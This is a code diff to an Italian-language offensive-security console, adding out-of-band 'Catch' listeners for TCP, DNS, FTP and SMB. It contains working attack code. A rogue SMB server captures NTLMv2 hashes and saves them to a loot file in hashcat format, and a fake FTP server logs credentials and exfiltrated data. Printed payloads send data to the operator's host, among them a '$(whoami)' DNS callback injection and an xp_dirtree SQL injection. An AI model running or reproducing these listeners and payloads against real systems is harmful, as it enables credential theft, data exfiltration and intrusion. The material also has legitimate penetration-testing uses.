@@ -52,6 +52,14 @@ _log_entries: list[dict[str, str]] = []
 _log_lock = threading.Lock()
 _LOG_MAX = 500
 
+# ---------------------------------------------------------------------------
+# Catch — OOB listener state
+# ---------------------------------------------------------------------------
+_catch_servers: dict[str, dict] = {}
+_catch_lock = threading.Lock()
+_CATCH_LOG_MAX = 500
+_catch_tokens: list[str] = []
+
 
 def parsed_query_flags(raw_path: str) -> str:
     q = raw_path.split("?", 1)[1] if "?" in raw_path else ""
@@ -779,7 +787,7 @@ def _discover_tools() -> list[tuple[str, str]]:
 
 def _base_html(title: str, body: str, active: str = "") -> str:
     docs_keys = {"notes", "vuln", "tools"}
-    server_keys = {"static", "delivery", "loot", "logs"}
+    server_keys = {"static", "delivery", "loot", "logs", "catch"}
 
     def _drop(label, items, active_key):
         is_active = active_key in {k for _, _, k in items}
@@ -802,6 +810,7 @@ def _base_html(title: str, body: str, active: str = "") -> str:
         ("/static/", "Payload", "static"),
         ("/delivery", "Delivery", "delivery"),
         ("/loot/", "Loot", "loot"),
+        ("/catch", "Catch", "catch"),
         ("/logs", "Logs", "logs"),
     ], active)
     pet_cls = ' class="active"' if active == "pet" else ""
@@ -924,6 +933,7 @@ def _page_home() -> str:
       <li><a href="/static/">Payload</a><span class="cnt">{n_static} file</span></li>
       <li><a href="/delivery">Delivery</a><span class="cnt">payload &amp; curl</span></li>
       <li><a href="/loot/">Loot</a><span class="cnt">{n_loot} file</span></li>
+      <li><a href="/catch">Catch</a><span class="cnt">OOB listeners</span></li>
       <li><a href="/logs">Logs</a><span class="cnt">server logs</span></li>
     </ul>
   </div>
@@ -969,6 +979,7 @@ def _page_home() -> str:
     {{name:'payload',label:'Payload',cnt:'{n_static} file',href:'/static/'}},
     {{name:'loot',label:'Loot',cnt:'{n_loot} file',href:'/loot/'}},
     {{name:'delivery',label:'Delivery',cnt:'payload & curl',href:'/delivery'}},
+    {{name:'catch',label:'Catch',cnt:'OOB listeners',href:'/catch'}},
     {{name:'logs',label:'Logs',cnt:'server logs',href:'/logs'}},
     {{name:'pet',label:'Pet',cnt:'sealion virtuale',href:'/pet'}},
     {{name:'burp',label:'BURP',cnt:'password profiler',href:'/burp'}},
@@ -2930,6 +2941,104 @@ document.getElementById('lport-val').addEventListener('keydown',function(e){{if(
     return _base_html("Delivery", body, active="delivery")
 
 
+def _page_catch() -> str:
+    body = """\
+<div class="container">
+<div class="breadcrumb"><a href="/">Home</a> <span>/</span> Catch</div>
+<div class="page-title">OOB Listeners</div>
+<div class="page-sub" id="catch-sub">Listeners per conferma blind e cattura dati</div>
+
+<div id="catch-status" style="margin:16px 0;display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:10px"></div>
+
+<div style="margin:12px 0;display:flex;gap:10px;align-items:center;flex-wrap:wrap">
+  <select id="catch-filter" style="background:var(--surface);border:1px solid var(--border);color:var(--text);padding:4px 10px;border-radius:4px;font-size:13px">
+    <option value="">Tutti</option>
+    <option value="tcp">TCP</option>
+    <option value="dns">DNS</option>
+    <option value="ftp">FTP</option>
+    <option value="smb">SMB</option>
+  </select>
+  <label style="display:flex;align-items:center;gap:6px;color:var(--text2);font-size:13px;cursor:pointer">
+    <input type="checkbox" id="catch-auto" checked> Auto-scroll
+  </label>
+  <button onclick="document.getElementById('catch-body').innerHTML='';window._catchReset()"
+    style="background:var(--surface);border:1px solid var(--border);color:var(--text2);
+    padding:4px 12px;border-radius:4px;cursor:pointer;font-size:12px">Clear</button>
+  <span style="color:var(--text2);font-size:11px;margin-left:auto" id="catch-status-txt">connecting...</span>
+</div>
+<div class="log-table-wrap">
+<table class="log-table">
+<thead><tr><th style="width:70px">Ora</th><th style="width:50px">Tipo</th><th style="width:130px">Client</th><th>Evento</th></tr></thead>
+<tbody id="catch-body"></tbody>
+</table>
+</div>
+</div>
+<script>
+(function(){
+  var offset=0;
+  var tbody=document.getElementById('catch-body');
+  var statusTxt=document.getElementById('catch-status-txt');
+  var autoChk=document.getElementById('catch-auto');
+  var filterEl=document.getElementById('catch-filter');
+  var statusDiv=document.getElementById('catch-status');
+
+  var colors={tcp:'#58a6ff',dns:'#f0883e',ftp:'#a371f7',smb:'#3fb950'};
+
+  window._catchReset=function(){offset=0;};
+
+  function pollStatus(){
+    fetch('/api/catch/status').then(function(r){return r.json();}).then(function(data){
+      var h='';
+      ['tcp','dns','ftp','smb'].forEach(function(t){
+        var s=data[t];
+        var active=s&&s.active;
+        var dot=active?'<span style="color:var(--green)">●</span>':'<span style="color:var(--text2)">○</span>';
+        var info=active?'porta '+s.port+' — '+s.events+' eventi':'inattivo';
+        h+='<div style="background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:10px 14px">'
+          +dot+' <strong style="color:'+colors[t]+'">'+t.toUpperCase()+'</strong>'
+          +'<div style="color:var(--text2);font-size:12px;margin-top:3px">'+info+'</div></div>';
+      });
+      statusDiv.innerHTML=h;
+    }).catch(function(){});
+  }
+
+  function pollLogs(){
+    var url='/api/catch/logs?since='+offset;
+    var f=filterEl.value;
+    if(f)url+='&type='+f;
+    fetch(url).then(function(r){return r.json();}).then(function(data){
+      statusTxt.textContent='live';
+      statusTxt.style.color='var(--green)';
+      if(data.entries&&data.entries.length){
+        data.entries.forEach(function(e){
+          var tr=document.createElement('tr');
+          var c=colors[e.type]||'var(--text2)';
+          tr.innerHTML='<td class="log-ts">'+esc(e.ts)+'</td>'
+            +'<td style="color:'+c+';font-weight:600;font-size:12px">'+esc((e.type||'').toUpperCase())+'</td>'
+            +'<td class="log-client">'+esc(e.client)+'</td>'
+            +'<td class="log-msg">'+esc(e.msg)+'</td>';
+          tbody.appendChild(tr);
+        });
+        offset=data.total;
+        if(autoChk.checked){
+          var wrap=document.querySelector('.log-table-wrap');
+          wrap.scrollTop=wrap.scrollHeight;
+        }
+      }
+    }).catch(function(){
+      statusTxt.textContent='disconnected';
+      statusTxt.style.color='var(--red)';
+    });
+  }
+
+  function esc(s){var d=document.createElement('div');d.textContent=s;return d.innerHTML;}
+  pollStatus();pollLogs();
+  setInterval(function(){pollStatus();pollLogs();},2000);
+})();
+</script>"""
+    return _base_html("Catch", body, active="catch")
+
+
 def _page_logs() -> str:
     body = """\
 <div class="container">
@@ -3112,6 +3221,24 @@ class SlRequestHandler(http.server.BaseHTTPRequestHandler):
                 entries = _log_entries[since:]
                 total = len(_log_entries)
             self._send_json({"entries": entries, "total": total})
+        elif path == "/catch":
+            self._send_html(_page_catch())
+        elif path == "/api/catch/logs":
+            stype = qs.get("type", [None])[0]
+            since = int(qs.get("since", ["0"])[0])
+            logs = catch_logs(stype)
+            entries = logs[since:]
+            self._send_json({"entries": entries, "total": len(logs)})
+        elif path == "/api/catch/status":
+            info = {}
+            for st in _CATCH_TYPES:
+                if st in _catch_servers:
+                    si = _catch_servers[st]
+                    info[st] = {"active": True, "port": si["port"],
+                                "events": len(si["logs"])}
+                else:
+                    info[st] = {"active": False}
+            self._send_json(info)
         elif path == "/notes":
             self._send_html(_page_list("Notes", "notes", _discover_notes()))
         elif path.startswith("/notes/"):
@@ -4297,3 +4424,568 @@ def pivot_status() -> str:
                  f"-ignore-cert &\033[0m")
     lines.append("")
     return "\n".join(lines)
+
+
+# ===================================================================
+# Catch — OOB listeners (TCP, DNS, FTP, SMB)
+# ===================================================================
+
+_CATCH_TYPES = ("tcp", "dns", "ftp", "smb")
+_CATCH_DEFAULT_PORTS = {"tcp": 4444, "dns": 53, "ftp": 2121, "smb": 445}
+
+
+def _catch_log(server_type: str, client: str, msg: str) -> None:
+    import time as _time
+    ts = _time.strftime("%H:%M:%S")
+    entry = {"ts": ts, "client": client, "msg": msg, "type": server_type}
+    with _catch_lock:
+        info = _catch_servers.get(server_type)
+        if info is not None:
+            logs = info["logs"]
+            logs.append(entry)
+            if len(logs) > _CATCH_LOG_MAX:
+                del logs[: len(logs) - _CATCH_LOG_MAX]
+
+
+# --- TCP raw listener ---------------------------------------------------
+
+class _CatchTCPHandler(socketserver.BaseRequestHandler):
+    def handle(self):
+        client = f"{self.client_address[0]}:{self.client_address[1]}"
+        _catch_log("tcp", self.client_address[0],
+                   f"Connessione da {client}")
+        try:
+            while True:
+                data = self.request.recv(4096)
+                if not data:
+                    break
+                preview = data[:4096]
+                try:
+                    text = preview.decode("utf-8", errors="replace")
+                except Exception:
+                    text = preview.hex()
+                _catch_log("tcp", self.client_address[0],
+                           f"[{len(data)}B] {text}")
+        except Exception:
+            pass
+        _catch_log("tcp", self.client_address[0],
+                   f"Disconnessione da {client}")
+
+
+class _CatchTCPServer(socketserver.TCPServer):
+    allow_reuse_address = True
+    daemon_threads = True
+
+    def handle_error(self, request, client_address):
+        pass
+
+
+# --- DNS logger ----------------------------------------------------------
+
+class _CatchDNSHandler(socketserver.BaseRequestHandler):
+    _QTYPES = {1: "A", 2: "NS", 5: "CNAME", 6: "SOA", 12: "PTR",
+               15: "MX", 16: "TXT", 28: "AAAA", 33: "SRV", 255: "ANY"}
+
+    def handle(self):
+        data = self.request[0]
+        sock = self.request[1]
+        client = self.client_address[0]
+        try:
+            qname, qtype_num = self._parse_query(data)
+        except Exception:
+            _catch_log("dns", client, f"Pacchetto DNS malformato ({len(data)}B)")
+            return
+
+        qtype = self._QTYPES.get(qtype_num, f"TYPE{qtype_num}")
+
+        token_hit = ""
+        for t in _catch_tokens:
+            if t in qname.lower():
+                token_hit = f"  \033[92m★ TOKEN {t}\033[0m"
+                break
+
+        _catch_log("dns", client, f"{qtype} {qname}{token_hit}")
+
+        # empty NXDOMAIN response
+        resp = bytearray(data[:2])  # copy txn ID
+        resp += b"\x81\x83"         # flags: response, NXDOMAIN
+        resp += data[4:6]           # QDCOUNT
+        resp += b"\x00\x00\x00\x00\x00\x00"  # ANCOUNT, NSCOUNT, ARCOUNT
+        resp += data[12:]           # echo question section
+        sock.sendto(bytes(resp), self.client_address)
+
+    @staticmethod
+    def _parse_query(data: bytes) -> tuple[str, int]:
+        pos = 12  # skip header
+        labels = []
+        while pos < len(data):
+            length = data[pos]
+            if length == 0:
+                pos += 1
+                break
+            pos += 1
+            labels.append(data[pos:pos + length].decode("ascii", errors="replace"))
+            pos += length
+        qname = ".".join(labels) if labels else "<empty>"
+        qtype = int.from_bytes(data[pos:pos + 2], "big") if pos + 2 <= len(data) else 0
+        return qname, qtype
+
+
+class _CatchDNSServer(socketserver.UDPServer):
+    allow_reuse_address = True
+
+    def handle_error(self, request, client_address):
+        pass
+
+
+# --- FTP logger ----------------------------------------------------------
+
+class _CatchFTPHandler(socketserver.StreamRequestHandler):
+    def handle(self):
+        client = f"{self.client_address[0]}:{self.client_address[1]}"
+        _catch_log("ftp", self.client_address[0], f"Connessione da {client}")
+        self._send("220 SLConsole FTP ready")
+        data_buf: list[bytes] = []
+        stor_name = ""
+        try:
+            while True:
+                line = self.rfile.readline(4096)
+                if not line:
+                    break
+                line = line.decode("utf-8", errors="replace").strip()
+                if not line:
+                    continue
+                parts = line.split(None, 1)
+                cmd = parts[0].upper()
+                arg = parts[1] if len(parts) > 1 else ""
+
+                _catch_log("ftp", self.client_address[0], f"← {line}")
+
+                if cmd == "USER":
+                    _catch_log("ftp", self.client_address[0],
+                               f"Credenziali: USER={arg}")
+                    self._send("331 Password required")
+                elif cmd == "PASS":
+                    _catch_log("ftp", self.client_address[0],
+                               f"Credenziali: PASS={arg}")
+                    self._send("230 Login OK")
+                elif cmd == "SYST":
+                    self._send("215 UNIX Type: L8")
+                elif cmd == "TYPE":
+                    self._send("200 Type set")
+                elif cmd == "PWD":
+                    self._send('257 "/" is current directory')
+                elif cmd == "CWD":
+                    self._send("250 OK")
+                elif cmd == "PASV":
+                    self._send("425 Use PORT instead")
+                elif cmd == "PORT":
+                    self._send("200 PORT OK")
+                elif cmd == "LIST":
+                    self._send("150 Here comes listing")
+                    self._send("226 Listing done")
+                elif cmd == "STOR":
+                    stor_name = arg
+                    self._send("150 OK send data")
+                    raw = self.rfile.read(65536)
+                    if raw:
+                        try:
+                            text = raw.decode("utf-8", errors="replace")
+                        except Exception:
+                            text = f"<binary {len(raw)}B>"
+                        _catch_log("ftp", self.client_address[0],
+                                   f"STOR {stor_name} [{len(raw)}B]: {text[:2048]}")
+                    self._send("226 Transfer complete")
+                elif cmd == "RETR":
+                    self._send("550 File not found")
+                elif cmd in ("QUIT", "BYE"):
+                    self._send("221 Bye")
+                    break
+                elif cmd == "FEAT":
+                    self._send("211 End")
+                elif cmd == "OPTS":
+                    self._send("200 OK")
+                elif cmd == "SIZE":
+                    self._send("550 Not found")
+                elif cmd == "MDTM":
+                    self._send("550 Not found")
+                elif cmd == "EPSV":
+                    self._send("500 Not supported")
+                elif cmd == "EPRT":
+                    self._send("500 Not supported")
+                else:
+                    self._send("500 Unknown command")
+        except Exception:
+            pass
+        _catch_log("ftp", self.client_address[0], f"Disconnessione da {client}")
+
+    def _send(self, msg: str) -> None:
+        self.wfile.write((msg + "\r\n").encode("utf-8"))
+        self.wfile.flush()
+
+
+class _CatchFTPServer(socketserver.TCPServer):
+    allow_reuse_address = True
+    daemon_threads = True
+
+    def handle_error(self, request, client_address):
+        pass
+
+
+# --- SMB auth capture (pure Python, no impacket) -------------------------
+# Minimal SMB1 Negotiate + NTLMSSP challenge/response to grab NTLMv2 hashes.
+# Outputs hashes in hashcat -m 5600 format: user::domain:challenge:ntproof:blob
+
+import struct as _struct
+
+_SMB_CHALLENGE = os.urandom(8)
+
+
+def _smb_neg_response(challenge: bytes) -> bytes:
+    """Build SMB1 Negotiate response with NTLMSSP challenge."""
+    # NTLMSSP_CHALLENGE token
+    target_name = "SEALION".encode("utf-16-le")
+    target_info = b""
+    # MsvAvNbDomainName (type 2)
+    ti_domain = "SEALION".encode("utf-16-le")
+    target_info += _struct.pack("<HH", 2, len(ti_domain)) + ti_domain
+    # MsvAvNbComputerName (type 1)
+    ti_comp = "SLC".encode("utf-16-le")
+    target_info += _struct.pack("<HH", 1, len(ti_comp)) + ti_comp
+    # MsvAvEOL (type 0)
+    target_info += _struct.pack("<HH", 0, 0)
+
+    ntlmssp = b"NTLMSSP\x00"
+    ntlmssp += _struct.pack("<I", 2)  # type 2 = challenge
+    # target name fields
+    offset = 56  # fixed offset after header
+    ntlmssp += _struct.pack("<HHI", len(target_name), len(target_name), offset)
+    # negotiate flags: NTLM | TARGET_INFO | UNICODE | REQUEST_TARGET
+    flags = 0x00028233
+    ntlmssp += _struct.pack("<I", flags)
+    ntlmssp += challenge  # 8 bytes
+    ntlmssp += b"\x00" * 8  # reserved
+    # target info fields
+    ti_offset = offset + len(target_name)
+    ntlmssp += _struct.pack("<HHI", len(target_info), len(target_info), ti_offset)
+    ntlmssp += target_name
+    ntlmssp += target_info
+
+    # Wrap in SPNEGO / raw -- we send as security blob in SMB1 negotiate resp
+    # Build SMB1 Negotiate Protocol Response
+    smb_hdr = b"\xffSMB"  # server component
+    smb_hdr += b"\x72"     # command: negotiate
+    smb_hdr += b"\x00\x00\x00\x00"  # status
+    smb_hdr += b"\x88"     # flags: reply + case sensitive
+    smb_hdr += _struct.pack("<H", 0xC803)  # flags2: unicode + extended security + long names
+    smb_hdr += b"\x00" * 12  # PID_high(2) + signature(8) + reserved(2)
+    smb_hdr += _struct.pack("<H", 0)  # TID
+    smb_hdr += _struct.pack("<H", 0)  # PID
+    smb_hdr += _struct.pack("<H", 0)  # UID
+    smb_hdr += _struct.pack("<H", 0)  # MID
+
+    # word count for negotiate response (extended security) = 17 words
+    words = b""
+    words += _struct.pack("<H", 0)      # dialect index (NT LM 0.12)
+    words += b"\x03"                     # security mode
+    words += _struct.pack("<H", 1)      # max mpx
+    words += _struct.pack("<H", 1)      # max VCs
+    words += _struct.pack("<I", 16644)  # max buffer
+    words += _struct.pack("<I", 65536)  # max raw
+    words += _struct.pack("<I", 0)      # session key
+    cap = 0xF3F9  # capabilities: extended security + ...
+    words += _struct.pack("<I", cap)
+    words += b"\x00" * 8   # system time
+    words += _struct.pack("<H", 0)  # server timezone
+    words += b"\x00"        # encryption key length
+
+    blob = ntlmssp  # raw NTLMSSP (no SPNEGO wrapper for simplicity)
+    byte_count = len(blob) + 16  # + GUID
+    guid = os.urandom(16)
+
+    data = _struct.pack("<B", 17)  # word count
+    data += words
+    data += _struct.pack("<H", byte_count)
+    data += guid
+    data += blob
+
+    packet = b"\x00" * 4  # NetBIOS placeholder
+    packet += smb_hdr
+    packet += data
+    # fix NetBIOS length
+    plen = len(packet) - 4
+    packet = b"\x00" + _struct.pack(">I", plen)[1:] + packet[4:]
+    return packet
+
+
+def _smb_parse_ntlmssp_auth(data: bytes) -> dict | None:
+    """Extract NTLMv2 fields from an NTLMSSP_AUTH message."""
+    idx = data.find(b"NTLMSSP\x00\x03\x00\x00\x00")
+    if idx < 0:
+        return None
+    msg = data[idx:]
+    if len(msg) < 88:
+        return None
+
+    def _field(off):
+        flen = _struct.unpack_from("<H", msg, off)[0]
+        foff = _struct.unpack_from("<I", msg, off + 4)[0]
+        return msg[foff:foff + flen] if foff + flen <= len(msg) else b""
+
+    lm_resp = _field(12)
+    nt_resp = _field(20)
+    domain_b = _field(28)
+    user_b = _field(36)
+    host_b = _field(44)
+
+    try:
+        domain = domain_b.decode("utf-16-le", errors="replace")
+        user = user_b.decode("utf-16-le", errors="replace")
+        host = host_b.decode("utf-16-le", errors="replace")
+    except Exception:
+        domain = user = host = "?"
+
+    if len(nt_resp) > 24:
+        nt_proof = nt_resp[:16].hex()
+        blob = nt_resp[16:].hex()
+    else:
+        nt_proof = nt_resp.hex()
+        blob = ""
+
+    return {"user": user, "domain": domain, "host": host,
+            "nt_proof": nt_proof, "blob": blob}
+
+
+class _CatchSMBHandler(socketserver.BaseRequestHandler):
+    def handle(self):
+        client = self.client_address[0]
+        _catch_log("smb", client, f"Connessione da {client}")
+        try:
+            self._do_smb(client)
+        except Exception:
+            pass
+        _catch_log("smb", client, f"Disconnessione da {client}")
+
+    def _do_smb(self, client: str) -> None:
+        conn = self.request
+        conn.settimeout(10)
+
+        # 1. Read SMB negotiate request
+        raw = self._recv_nb(conn)
+        if not raw:
+            return
+
+        # 2. Send challenge
+        challenge = _SMB_CHALLENGE
+        resp = _smb_neg_response(challenge)
+        conn.sendall(resp)
+
+        # 3. Read session setup (auth)
+        raw2 = self._recv_nb(conn)
+        if not raw2:
+            return
+
+        auth = _smb_parse_ntlmssp_auth(raw2)
+        if auth:
+            chall_hex = challenge.hex()
+            hashline = (f"{auth['user']}::{auth['domain']}:"
+                        f"{chall_hex}:{auth['nt_proof']}:{auth['blob']}")
+            _catch_log("smb", client,
+                       f"\033[92m[NTLMv2] {auth['user']}@{auth['domain']} "
+                       f"({auth['host']})\033[0m")
+            _catch_log("smb", client, f"\033[93m{hashline}\033[0m")
+
+            hash_file = LOOT_ROOT / "ntlmv2_hashes.txt"
+            LOOT_ROOT.mkdir(parents=True, exist_ok=True)
+            with open(hash_file, "a") as f:
+                f.write(hashline + "\n")
+            _catch_log("smb", client,
+                       f"Hash salvato in loot/ntlmv2_hashes.txt")
+        else:
+            _catch_log("smb", client, "Auth ricevuta ma NTLMSSP non trovato")
+
+        # Send STATUS_LOGON_FAILURE so the client retries
+        err_resp = self._smb_error(raw2)
+        conn.sendall(err_resp)
+
+    @staticmethod
+    def _recv_nb(conn) -> bytes | None:
+        try:
+            hdr = b""
+            while len(hdr) < 4:
+                chunk = conn.recv(4 - len(hdr))
+                if not chunk:
+                    return None
+                hdr += chunk
+            plen = _struct.unpack(">I", b"\x00" + hdr[1:4])[0]
+            data = b""
+            while len(data) < plen:
+                chunk = conn.recv(plen - len(data))
+                if not chunk:
+                    return None
+                data += chunk
+            return data
+        except Exception:
+            return None
+
+    @staticmethod
+    def _smb_error(raw_request: bytes) -> bytes:
+        smb_hdr = b"\xffSMB"
+        smb_hdr += b"\x73"  # session setup
+        smb_hdr += _struct.pack("<I", 0xC000006D)  # STATUS_LOGON_FAILURE
+        smb_hdr += b"\x88"
+        smb_hdr += _struct.pack("<H", 0xC803)
+        smb_hdr += b"\x00" * 18
+        data = b"\x00" + _struct.pack("<H", 0)  # word count 0, byte count 0
+        packet = b"\x00" * 4 + smb_hdr + data
+        plen = len(packet) - 4
+        packet = b"\x00" + _struct.pack(">I", plen)[1:] + packet[4:]
+        return packet
+
+
+class _CatchSMBServer(socketserver.TCPServer):
+    allow_reuse_address = True
+    daemon_threads = True
+
+    def handle_error(self, request, client_address):
+        pass
+
+
+# --- Catch public API ----------------------------------------------------
+
+def catch_start(server_type: str, port: int | None = None) -> str:
+    server_type = server_type.lower()
+    if server_type not in _CATCH_TYPES:
+        return f"Tipo non valido: {server_type}. Tipi: {', '.join(_CATCH_TYPES)}"
+
+    if server_type in _catch_servers:
+        info = _catch_servers[server_type]
+        return f"{server_type.upper()} listener già attivo sulla porta {info['port']}."
+
+    if port is None:
+        port = _CATCH_DEFAULT_PORTS[server_type]
+
+    server_classes = {
+        "tcp": (_CatchTCPServer, _CatchTCPHandler),
+        "dns": (_CatchDNSServer, _CatchDNSHandler),
+        "ftp": (_CatchFTPServer, _CatchFTPHandler),
+        "smb": (_CatchSMBServer, _CatchSMBHandler),
+    }
+    srv_cls, handler_cls = server_classes[server_type]
+
+    try:
+        srv = srv_cls(("", port), handler_cls)
+    except OSError as exc:
+        return f"Impossibile avviare {server_type.upper()} sulla porta {port}: {exc}"
+
+    thr = threading.Thread(target=srv.serve_forever, daemon=True)
+    thr.start()
+
+    _catch_servers[server_type] = {"server": srv, "thread": thr,
+                                   "port": port, "logs": []}
+    _catch_log(server_type, "system",
+               f"{server_type.upper()} listener avviato sulla porta {port}")
+
+    lhost = _lhost or get_default_ip()
+    hints = {
+        "tcp": (f"\033[92mTCP listener attivo sulla porta {port}\033[0m\n"
+                f"\n  Verifica callback:\n"
+                f"  \033[96mcurl http://{lhost}:{port}/rce\033[0m\n"
+                f"  \033[96mnc {lhost} {port}\033[0m\n"),
+        "dns": (f"\033[92mDNS listener attivo sulla porta {port}\033[0m\n"
+                f"\n  Verifica callback:\n"
+                f"  \033[96mnslookup test.oob {lhost}\033[0m\n"
+                f"  \033[96mdig @{lhost} -p {port} test.oob\033[0m\n"
+                f"\n  Genera token: \033[93mcatch dns token\033[0m\n"),
+        "ftp": (f"\033[92mFTP listener attivo sulla porta {port}\033[0m\n"
+                f"\n  Payload XXE esfiltra dati via FTP:\n"
+                f"  \033[96mftp://{lhost}:{port}/exfil\033[0m\n"),
+        "smb": (f"\033[92mSMB listener attivo sulla porta {port}\033[0m\n"
+                f"\n  Payload per catturare hash NTLMv2:\n"
+                f"  \033[96m\\\\{lhost}\\x\\test\033[0m\n"
+                f"\n  Hash salvati in: \033[93mloot/ntlmv2_hashes.txt\033[0m\n"),
+    }
+    return hints.get(server_type, f"{server_type.upper()} attivo sulla porta {port}")
+
+
+def catch_stop(server_type: str = "all") -> str:
+    server_type = server_type.lower()
+    if server_type == "all":
+        if not _catch_servers:
+            return "Nessun listener attivo."
+        stopped = []
+        for stype in list(_catch_servers.keys()):
+            _stop_one(stype)
+            stopped.append(stype.upper())
+        return f"Listener arrestati: {', '.join(stopped)}"
+
+    if server_type not in _CATCH_TYPES:
+        return f"Tipo non valido: {server_type}. Tipi: {', '.join(_CATCH_TYPES)}"
+    if server_type not in _catch_servers:
+        return f"Nessun listener {server_type.upper()} attivo."
+
+    _stop_one(server_type)
+    return f"{server_type.upper()} listener arrestato."
+
+
+def _stop_one(server_type: str) -> None:
+    info = _catch_servers.pop(server_type, None)
+    if info is None:
+        return
+    srv = info.get("server")
+    try:
+        srv.shutdown()
+        srv.server_close()
+    except Exception:
+        pass
+
+
+def catch_status() -> str:
+    if not _catch_servers:
+        return "Nessun listener OOB attivo."
+    lines = ["\n  \033[1mOOB Listeners attivi:\033[0m\n"]
+    for stype in _CATCH_TYPES:
+        if stype in _catch_servers:
+            info = _catch_servers[stype]
+            n = len(info["logs"])
+            lines.append(f"    \033[92m●\033[0m {stype.upper():<5s}  "
+                         f"porta \033[96m{info['port']}\033[0m  "
+                         f"({n} {'evento' if n == 1 else 'eventi'})")
+    lines.append("")
+    return "\n".join(lines)
+
+
+def catch_logs(server_type: str | None = None) -> list[dict]:
+    with _catch_lock:
+        if server_type and server_type.lower() in _catch_servers:
+            return list(_catch_servers[server_type.lower()]["logs"])
+        all_logs = []
+        for info in _catch_servers.values():
+            all_logs.extend(info["logs"])
+        all_logs.sort(key=lambda e: e["ts"])
+        return all_logs
+
+
+def catch_clear_logs(server_type: str = "all") -> str:
+    with _catch_lock:
+        if server_type.lower() == "all":
+            for info in _catch_servers.values():
+                info["logs"].clear()
+            return "Log di tutti i listener svuotati."
+        st = server_type.lower()
+        if st in _catch_servers:
+            _catch_servers[st]["logs"].clear()
+            return f"Log {st.upper()} svuotati."
+    return f"Nessun listener {server_type.upper()} attivo."
+
+
+def catch_dns_token() -> str:
+    token = os.urandom(3).hex()
+    _catch_tokens.append(token)
+    lhost = _lhost or get_default_ip()
+    return (f"\n  Token: \033[92m{token}\033[0m\n"
+            f"\n  Payload di esempio:\n"
+            f"  \033[96m$(whoami).{token}.{lhost}\033[0m\n"
+            f"  \033[96mnslookup {token}.{lhost} {lhost}\033[0m\n"
+            f"  \033[96m'; EXEC master..xp_dirtree "
+            f"'\\\\{token}.{lhost}\\x'--\033[0m\n")
